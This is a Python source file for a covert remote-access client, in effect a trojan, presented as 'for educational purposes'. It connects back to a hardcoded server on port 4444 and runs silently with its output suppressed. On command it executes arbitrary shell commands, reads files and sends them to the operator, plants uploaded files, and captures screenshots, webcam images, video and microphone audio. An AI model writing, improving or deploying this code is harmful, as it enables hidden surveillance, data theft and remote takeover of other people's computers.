#!/usr/bin/env python3
"""
Enhanced Remote Client with Webcam and Audio Recording Capabilities
Strictly for educational purposes only.
"""

import socket
import json
import os
import sys
import platform
import subprocess
import time
import base64
import getpass
import socket as sock_lib
import logging
import threading
import io


# For screenshot functionality
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

# For webcam and audio functionality
try:
    import cv2
    WEBCAM_AVAILABLE = True
except ImportError:
    WEBCAM_AVAILABLE = False

try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False

class RemoteClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.socket = None
        self.running = False
        self.reconnect_delay = 5  # seconds
        self.webcam = None
        self.audio_recording = False
        self.audio_frames = []
        self.audio_stream = None
        self.audio_thread = None
        self.command_handlers = {
            'get_sysinfo': self.handle_get_sysinfo,
            'execute_command': self.handle_execute_command,
            'list_directory': self.handle_list_directory,
            'download_file': self.handle_download_file,
            'upload_file': self.handle_upload_file,
            'take_screenshot': self.handle_take_screenshot,
            'capture_webcam': self.handle_capture_webcam,
            'record_video': self.handle_record_video,
            'record_audio': self.handle_record_audio,
            'stop_audio_recording': self.handle_stop_audio_recording,
            'list_cameras': self.handle_list_cameras,
            'list_audio_devices': self.handle_list_audio_devices,
        }

    def get_system_info(self):
        """Gather system information"""
        try:
            hostname = sock_lib.gethostname()
            ip_address = sock_lib.gethostbyname(hostname)
        except Exception:
            hostname = "Unknown"
            ip_address = "Unknown"

        info = {
            'hostname': hostname,
            'username': getpass.getuser(),
            'platform': platform.system(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'ip_address': ip_address,
            'python_version': platform.python_version(),
            'capabilities': {
                'screenshot': SCREENSHOT_AVAILABLE,
                'webcam': WEBCAM_AVAILABLE,
                'audio': AUDIO_AVAILABLE
            }
        }
        return info

    def connect_to_server(self):
        """Connect to the server and send initial system information"""
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_host, self.server_port))
                self.running = True
                
                sys_info = self.get_system_info()
                self.send_data(json.dumps(sys_info))
                
                # print(f"[+] Connected to server at {self.server_host}:{self.server_port}")  # Silent mode
                # logging.info(f"Connected to server at {self.server_host}:{self.server_port}")
                return True
                
            except Exception as e:
                # print(f"[!] Failed to connect to server: {str(e)}")  # Silent mode
                # print(f"[*] Retrying in {self.reconnect_delay} seconds...")
                # logging.error(f"Failed to connect to server: {str(e)}")
                time.sleep(self.reconnect_delay)
                self.reconnect_delay = min(60, self.reconnect_delay * 1.5)

    def start_client(self):
        """Start the client and handle commands from the server"""
        if not self.connect_to_server():
            return
            
        try:
            while self.running:
                data = self.receive_data()
                if not data:
                    # print("[!] Lost connection to server")  # Silent mode
                    # logging.warning("Lost connection to server")
                    break
                    
                try:
                    command = json.loads(data)
                    self.process_command(command)
                except json.JSONDecodeError:
                    # print(f"[!] Invalid command format: {data}")  # Silent mode
                    # logging.error(f"Invalid command format: {data}")
                    pass
                    
        except Exception as e:
            # print(f"[!] Error: {str(e)}")  # Silent mode
            # logging.error(f"Error: {str(e)}")
            pass
        finally:
            self.cleanup()
            self.running = False
            self.close_connection()
            # print("[*] Attempting to reconnect...")  # Silent mode
            time.sleep(self.reconnect_delay)
            self.reconnect_delay = 5
            self.start_client()

    def cleanup(self):
        """Clean up resources before closing"""
        if self.webcam:
            self.webcam.release()
            self.webcam = None
        
        if self.audio_recording:
            self.audio_recording = False
            if self.audio_stream:
                self.audio_stream.stop_stream()
                self.audio_stream.close()
                self.audio_stream = None

    def process_command(self, command):
        """Process a command received from the server"""
        if 'type' not in command or 'data' not in command:
            self.send_response({'error': 'Invalid command format'})
            return
            
        command_type = command['type']
        command_data = command['data']
        
        if command_type in self.command_handlers:
            try:
                response = self.command_handlers[command_type](command_data)
                self.send_response(response)
            except Exception as e:
                self.send_response({'error': f"Error processing command: {str(e)}"})
        else:
            self.send_response({'error': f"Unknown command type: {command_type}"})

    def send_response(self, response):
        """Send a response back to the server"""
        self.send_data(json.dumps(response))

    def send_data(self, data):
        """Send data to the server with length prefix"""
        try:
            serialized_data = data.encode('utf-8')
            data_length = len(serialized_data)
            header = data_length.to_bytes(4, byteorder='big')
            self.socket.sendall(header + serialized_data)
        except Exception as e:
            # logging.error(f"Error sending data: {str(e)}")
            raise Exception(f"Error sending data: {str(e)}")

    def receive_data(self):
        """Receive data from the server with length prefix"""
        try:
            header = self.socket.recv(4)
            if not header or len(header) < 4:
                return None
                
            data_length = int.from_bytes(header, byteorder='big')
            
            data = b''
            bytes_received = 0
            while bytes_received < data_length:
                chunk = self.socket.recv(min(data_length - bytes_received, 4096))
                if not chunk:
                    return None
                data += chunk
                bytes_received += len(chunk)
                
            return data.decode('utf-8')
        except Exception as e:
            # logging.error(f"Error receiving data: {str(e)}")
            raise Exception(f"Error receiving data: {str(e)}")

    def close_connection(self):
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

    # Command handlers
    def handle_get_sysinfo(self, data):
        return {'info': self.get_system_info()}

    def handle_execute_command(self, data):
        if 'command' not in data:
            return {'error': 'No command specified'}
            
        command = data['command']
        try:
            if platform.system() == 'Windows':
                process = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                process = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE
                )
            stdout, stderr = process.communicate(timeout=15)
            output = stdout.decode('utf-8', errors='replace')
            if stderr:
                output += "\nStderr:\n" + stderr.decode('utf-8', errors='replace')
            return {'output': output}
        except subprocess.TimeoutExpired:
            return {'error': 'Command execution timed out'}
        except Exception as e:
            return {'error': f"Error executing command: {str(e)}"}

    def handle_list_directory(self, data):
        if 'path' not in data:
            return {'error': 'No path specified'}
        path = data['path']
        try:
            files = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                item_type = "directory" if os.path.isdir(item_path) else "file"
                file_info = {'name': item, 'type': item_type}
                if item_type == 'file':
                    file_info['size'] = os.path.getsize(item_path)
                files.append(file_info)
            return {'path': path, 'files': files}
        except Exception as e:
            return {'error': f"Error listing directory: {str(e)}"}

    def handle_download_file(self, data):
        if 'path' not in data:
            return {'error': 'No path specified'}
        path = data['path']
        try:
            if not os.path.exists(path):
                return {'error': 'File not found'}
            if os.path.isdir(path):
                return {'error': 'Path is a directory, not a file'}
            with open(path, 'rb') as f:
                file_content = base64.b64encode(f.read()).decode('utf-8')
            return {'filename': path, 'content': file_content}
        except Exception as e:
            return {'error': f"Error downloading file: {str(e)}"}

    def handle_upload_file(self, data):
        if 'path' not in data or 'content' not in data:
            return {'error': 'Path or content not specified'}
        path = data['path']
        content = data['content']
        try:
            directory = os.path.dirname(path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            file_content = base64.b64decode(content)
            with open(path, 'wb') as f:
                f.write(file_content)
            return {'path': path}
        except Exception as e:
            return {'error': f"Error uploading file: {str(e)}"}

    def handle_take_screenshot(self, data):
        if not SCREENSHOT_AVAILABLE:
            return {'error': 'Screenshot functionality not available (PIL not installed)'}
        try:
            screenshot = ImageGrab.grab()
            import io
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            screenshot_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
            return {'screenshot': screenshot_data}
        except Exception as e:
            return {'error': f"Error taking screenshot: {str(e)}"}

    def handle_list_cameras(self, data):
        """List available camera devices"""
        if not WEBCAM_AVAILABLE:
            return {'error': 'Webcam functionality not available (OpenCV not installed)'}
        
        cameras = []
        for i in range(10):  # Check first 10 camera indices
            cap = cv2.VideoCapture(i)
            if cap.isOpened():
                cameras.append({'index': i, 'name': f'Camera {i}'})
                cap.release()
        
        return {'cameras': cameras}

    def handle_capture_webcam(self, data):
        """Capture a single frame from webcam"""
        if not WEBCAM_AVAILABLE:
            return {'error': 'Webcam functionality not available (OpenCV not installed)'}
        
        camera_index = data.get('camera_index', 0)
        
        try:
            cap = cv2.VideoCapture(camera_index)
            if not cap.isOpened():
                return {'error': f'Cannot open camera {camera_index}'}
            
            ret, frame = cap.read()
            if not ret:
                cap.release()
                return {'error': 'Failed to capture frame'}
            
            # Convert frame to JPEG
            _, buffer = cv2.imencode('.jpg', frame)
            image_data = base64.b64encode(buffer).decode('utf-8')
            
            cap.release()
            return {'image': image_data, 'format': 'jpeg'}
            
        except Exception as e:
            return {'error': f"Error capturing webcam: {str(e)}"}

    def handle_record_video(self, data):
        """Record video from webcam for specified duration"""
        if not WEBCAM_AVAILABLE:
            return {'error': 'Webcam functionality not available (OpenCV not installed)'}
        
        camera_index = data.get('camera_index', 0)
        duration = data.get('duration', 5)  # Default 5 seconds
        fps = data.get('fps', 20)  # Default 20 FPS
        
        try:
            cap = cv2.VideoCapture(camera_index)
            if not cap.isOpened():
                return {'error': f'Cannot open camera {camera_index}'}
            
            # Set camera properties
            cap.set(cv2.CAP_PROP_FPS, fps)
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            
            # Create temporary video file
            temp_filename = f'temp_video_{int(time.time())}.avi'
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(temp_filename, fourcc, fps, (width, height))
            
            start_time = time.time()
            frames_captured = 0
            
            while (time.time() - start_time) < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
                frames_captured += 1
            
            cap.release()
            out.release()
            
            # Read the video file and encode to base64
            with open(temp_filename, 'rb') as f:
                video_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Clean up temporary file
            os.remove(temp_filename)
            
            return {
                'video': video_data,
                'format': 'avi',
                'duration': duration,
                'fps': fps,
                'frames': frames_captured,
                'resolution': f'{width}x{height}'
            }
            
        except Exception as e:
            return {'error': f"Error recording video: {str(e)}"}

    def handle_list_audio_devices(self, data):
        """List available audio input devices"""
        if not AUDIO_AVAILABLE:
            return {'error': 'Audio functionality not available (PyAudio not installed)'}
        
        try:
            p = pyaudio.PyAudio()
            devices = []
            
            for i in range(p.get_device_count()):
                info = p.get_device_info_by_index(i)
                if info['maxInputChannels'] > 0:  # Input device
                    devices.append({
                        'index': i,
                        'name': info['name'],
                        'channels': info['maxInputChannels'],
                        'sample_rate': int(info['defaultSampleRate'])
                    })
            
            p.terminate()
            return {'devices': devices}
            
        except Exception as e:
            return {'error': f"Error listing audio devices: {str(e)}"}

    def handle_record_audio(self, data):
        """Start recording audio"""
        if not AUDIO_AVAILABLE:
            return {'error': 'Audio functionality not available (PyAudio not installed)'}
        
        if self.audio_recording:
            return {'error': 'Audio recording already in progress'}
        
        device_index = data.get('device_index', None)  # None means default device
        duration = data.get('duration', 10)  # Default 10 seconds
        sample_rate = data.get('sample_rate', 44100)
        channels = data.get('channels', 1)  # Mono by default
        
        try:
            p = pyaudio.PyAudio()
            
            # Audio recording parameters
            chunk = 1024
            format = pyaudio.paInt16
            
            self.audio_frames = []
            self.audio_recording = True
            
            def record_audio():
                try:
                    stream = p.open(
                        format=format,
                        channels=channels,
                        rate=sample_rate,
                        input=True,
                        input_device_index=device_index,
                        frames_per_buffer=chunk
                    )
                    
                    self.audio_stream = stream
                    start_time = time.time()
                    
                    while self.audio_recording and (time.time() - start_time) < duration:
                        data = stream.read(chunk, exception_on_overflow=False)
                        self.audio_frames.append(data)
                    
                    stream.stop_stream()
                    stream.close()
                    self.audio_stream = None
                    
                except Exception as e:
                    self.audio_recording = False
                    # logging.error(f"Audio recording error: {str(e)}")
                
                finally:
                    p.terminate()
            
            # Start recording in a separate thread
            self.audio_thread = threading.Thread(target=record_audio)
            self.audio_thread.start()
            
            return {
                'status': 'recording_started',
                'duration': duration,
                'sample_rate': sample_rate,
                'channels': channels
            }
            
        except Exception as e:
            self.audio_recording = False
            return {'error': f"Error starting audio recording: {str(e)}"}

    def handle_stop_audio_recording(self, data):
        """Stop audio recording and return the recorded audio"""
        if not AUDIO_AVAILABLE:
            return {'error': 'Audio functionality not available (PyAudio not installed)'}
        
        if not self.audio_recording:
            return {'error': 'No audio recording in progress'}
        
        try:
            # Stop recording
            self.audio_recording = False
            
            # Wait for recording thread to finish
            if self.audio_thread:
                self.audio_thread.join(timeout=5)
            
            if not self.audio_frames:
                return {'error': 'No audio data recorded'}
            
            # Create WAV file in memory
            sample_rate = data.get('sample_rate', 44100)
            channels = data.get('channels', 1)
            
            buffer = io.BytesIO()
            with wave.open(buffer, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(pyaudio.get_sample_size(pyaudio.paInt16))
                wf.setframerate(sample_rate)
                wf.writeframes(b''.join(self.audio_frames))
            
            # Encode to base64
            buffer.seek(0)
            audio_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
            
            # Clear the frames
            self.audio_frames = []
            
            return {
                'audio': audio_data,
                'format': 'wav',
                'sample_rate': sample_rate,
                'channels': channels,
                'duration': len(self.audio_frames) * 1024 / sample_rate if self.audio_frames else 0
            }
            
        except Exception as e:
            self.audio_recording = False
            self.audio_frames = []
            return {'error': f"Error stopping audio recording: {str(e)}"}

def main():
    # Hardcode your server IP and port here:
    host = '10.113.67.202'  # <-- Replace with your server IP
    port = 4444

    client = RemoteClient(host, port)
    try:
        client.start_client()
    except KeyboardInterrupt:
        # Silent exit
        pass
    finally:
        client.close_connection()

if __name__ == "__main__":
    main()